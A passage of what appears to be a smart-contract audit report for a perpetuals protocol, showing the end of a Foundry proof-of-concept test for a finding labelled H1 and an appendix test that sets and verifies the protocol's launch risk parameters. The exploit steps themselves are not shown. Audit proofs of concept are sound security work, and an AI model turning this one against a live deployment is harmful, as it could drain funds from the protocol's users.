        uint256 juniorValueAfterRevenue = pool.juniorPrincipal();
        console2.log("H1_REAL_CLAIM_JUNIOR_AFTER_TEST_REVENUE_6DP", juniorValueAfterRevenue);
        assertGt(juniorValueAfterRevenue, 0, "real-claim replay did not allocate Junior equity");

        (uint256 received,) = _redeemJuniorIntoWallet();
        assertGt(received, 0, "no actual Junior wallet receipt from real-claim replay");
        console2.log("H1_REAL_CLAIM_ACTUAL_JUNIOR_CASH_6DP", received);
    }
}
```

# Appendix C — Complete Foundry source

**File:** `packages/perps/test/perps/h1_audit/H1ReleaseParametersVerification.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {H1FinalCashAndRealClaimPoC} from "./H1FinalCashAndRealClaimPoC.t.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {ICfdEngineAdminHost} from "@plether/perps/interfaces/ICfdEngineAdminHost.sol";

contract H1ReleaseParametersVerification is H1FinalCashAndRealClaimPoC {
    function setUp() public override {
        super.setUp();

        uint256 originalTime = block.timestamp;
        ICfdEngineAdminHost.EngineRiskConfig memory config = _engineRiskConfig();

        config.riskParams = CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
        config.executionFeeBps = 4;
        config.frozenCloseSpreadBps = 50;
        config.settlementBufferBps = 25;

        // The actual Engine Admin applies the same configured launch parameters.
        engineAdmin.proposeRiskConfig(config);
        vm.warp(engineAdmin.riskConfigActivationTime());
        engineAdmin.finalizeRiskConfig();

        // Restore the fixture clock after the governance timelock.
        vm.warp(originalTime);

        ICfdEngineAdminHost.EngineRiskConfig memory actual = _engineRiskConfig();
        assertEq(actual.riskParams.vpiFactor, 0.01e18);
        assertEq(actual.riskParams.maxSkewRatio, 0.4e18);
        assertEq(actual.riskParams.maintMarginBps, 10);
        assertEq(actual.riskParams.initMarginBps, 20);
        assertEq(actual.riskParams.fadMarginBps, 300);
        assertEq(actual.riskParams.baseCarryBps, 500);
        assertEq(actual.executionFeeBps, 4);
        assertEq(actual.settlementBufferBps, 25);
    }

    function test_H1_ReleaseConfigurationConfirmed() public view {
        ICfdEngineAdminHost.EngineRiskConfig memory actual = _engineRiskConfig();
        assertEq(actual.riskParams.vpiFactor, 0.01e18);
        assertEq(actual.riskParams.maxSkewRatio, 0.4e18);
        assertEq(actual.executionFeeBps, 4);
    }
}
```

